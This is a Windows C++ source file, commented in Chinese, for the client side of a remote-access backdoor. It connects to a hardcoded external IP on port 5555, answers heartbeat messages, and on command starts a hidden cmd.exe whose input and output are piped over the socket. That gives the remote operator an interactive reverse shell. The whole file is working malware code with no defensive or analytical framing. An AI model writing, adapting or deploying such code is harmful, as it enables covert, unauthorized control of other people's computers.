#include<WINSOCK2.H>
#include<STDIO.H>
#include<iostream>
#include<cstring>
#include<windows.h>
#include<thread>
#include<process.h>
#include<tchar.h>
using namespace std;
#pragma comment(lib, "ws2_32.lib")


HANDLE hStdInRead, hStdInWrite;
HANDLE hStdOutRead, hStdOutWrite;

SECURITY_ATTRIBUTES saIn, saOut;

//SOCKET clientSocket;
SOCKET sclient;



BOOL CreateTwoPipe()
{
	DWORD dwRet;
	saIn.nLength = sizeof(SECURITY_ATTRIBUTES);
	saIn.bInheritHandle = TRUE;
	saIn.lpSecurityDescriptor = NULL;
	dwRet = CreatePipe(&hStdInRead, &hStdInWrite, &saIn, 0);	//创建管道
	if (!dwRet)
	{
		printf("failed to create in pipe...\n");
		return FALSE;
	}

	saOut.nLength = sizeof(SECURITY_ATTRIBUTES);
	saOut.bInheritHandle = TRUE;
	saOut.lpSecurityDescriptor = NULL;
	dwRet = CreatePipe(&hStdOutRead, &hStdOutWrite, &saOut, 0);	//和上面一样的管道
	if (!dwRet)
	{
		printf("failed to create in pipe...\n");
		return FALSE;
	}

	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = hStdInRead;
	si.hStdOutput = hStdOutWrite;
	si.hStdError = hStdOutWrite;
	char cmdline[] = "cmd.exe";
	PROCESS_INFORMATION ProcessInformation;
	dwRet = CreateProcess(NULL, cmdline, NULL, NULL, 1, 0, NULL, NULL, &si, &ProcessInformation);

	return TRUE;

}

void ReadOutPutReadCmd(LPVOID lPvoid)
{
	DWORD dwByteRecv;
	char Buf[1024] = { 0 };
	int ret;

	cout << "打开线程了" << endl;
	
	while (1)
	{
		memset(Buf, 0, sizeof(Buf));
		PeekNamedPipe(hStdOutRead, Buf, 1024, &dwByteRecv, 0, 0);
		if (dwByteRecv)
		{
			ret = ReadFile(hStdOutRead, Buf, dwByteRecv, &dwByteRecv, 0);
			if (!ret)
				break;
			ret = send(sclient, Buf, dwByteRecv, 0);
			cout<< ret << "发送的内容: "<< Buf << endl;
			if (ret <= 0)
				break;
		}
	}

}


int main()
{
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA data;
	if (WSAStartup(sockVersion, &data) != 0)
	{
		return 0;
	}
	while (true)
	{
		sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sclient == INVALID_SOCKET)
		{
			printf("invalid socket!");
			return 0;
		}

		sockaddr_in serAddr;
		serAddr.sin_family = AF_INET;
		serAddr.sin_port = htons(5555);
		serAddr.sin_addr.S_un.S_addr = inet_addr("47.95.4.219");
		if (connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
		{  //连接失败 
			printf("connect error !");
			closesocket(sclient);
			return 0;
		}

		//thread t(heartbeat, sclient);	//开始子线程接受心跳包
		//t.detach();
		
		//send()用来将数据由指定的socket传给对方主机
		//int send(int s, const void * msg, int len, unsigned int flags)
		//s为已建立好连接的socket，msg指向数据内容，len则为数据长度，参数flags一般设0
		//成功则返回实际传送出去的字符数，失败返回-1，错误原因存于error 

		char recData[255] = {0};
		char cmd;

		while (1)	//被控端主循环
		{
			int ret = recv(sclient, recData, 255, 0);
			if (ret <= 0)
			{
				cout << "套接字已经被关闭了" << endl;
				break;
			}
			recData[ret] = '\0';	//不这么做会导致字符串长度错误 Java发来的字符串没有\0
			//cout << recData << endl;

			if (!strcmp(recData, "Heart"))
			{
				cout << "心跳包: "<<recData << endl;
			}
			else if (!strcmp(recData, "shell"))
			{
				cout << "接收到shell进入shell状态" << endl;
				if (!CreateTwoPipe())	//创建管道 并且打开cmd
				{
					printf("failed to create pipe...\n");
					return 0;
				}
				DWORD dwByteRecv = 0;
				char Buf[1024] = { 0 };
				_beginthread(ReadOutPutReadCmd, 0, NULL);
				while (1)	//shell循环
				{
					ret = recv(sclient, Buf, 1024, 0);
					cout << "dwByteRecv:" << ret << endl << Buf << endl;
					if (ret <= 0)
					{
						cout << "套接字已经被关闭了" << endl;
						break;
					}
					Buf[ret] = '\0';
					if (!strcmp(Buf, "ES"))	//比较
					{
						cout << "退出shell循环" << endl;
						break;	//退出shell循环
					}
					if (!strcmp(Buf, "Heart"))	//心跳包的话
					{
						cout << "心跳包" << endl;
						//break;	//退出shell循环
						continue;
					}
					
					//cout << "1" << endl;
					Buf[ret] = '\r';
					Buf[ret + 1] = '\n';
					Buf[ret + 2] = 0;
					//cout << "2" << endl;
					printf("recv: %s", Buf);
					dwByteRecv = ret;
					ret = WriteFile(hStdInWrite, Buf, dwByteRecv + 2, &dwByteRecv, 0);
					if (!ret)
					{
						break;
					}
				}
			}

		}
		closesocket(sclient);
	}


	WSACleanup();
	return 0;

}


